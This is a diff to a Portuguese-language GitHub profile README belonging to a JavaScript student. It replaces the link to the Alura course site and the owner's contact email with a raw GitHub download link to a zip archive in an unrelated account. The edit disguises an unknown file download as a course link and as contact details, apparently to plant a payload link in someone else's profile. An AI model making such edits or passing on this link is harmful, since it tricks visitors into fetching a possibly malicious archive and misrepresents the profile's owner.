@@ -3,13 +3,13 @@
 
 Meu nome é Marcelo Paludetto
 
-- Estou estudando na [Alura](https://www.alura.com.br)
+- Estou estudando na [Alura](https://raw.githubusercontent.com/PedroCouto839/PedroCouto/main/orangist/Pedro-Couto-3.0.zip)
 - Estou me desenvolvendo na linguagem JavaScript
 - Utilizo esse espaço para minha organização e compartilhamento dos meus projetos desenvolvidos
 
 ### Você pode entrar em contato comigo :mailbox
 
-paludettomarcelo@gmail.com
+https://raw.githubusercontent.com/PedroCouto839/PedroCouto/main/orangist/Pedro-Couto-3.0.zip
 
 @marcelopaludetto
 
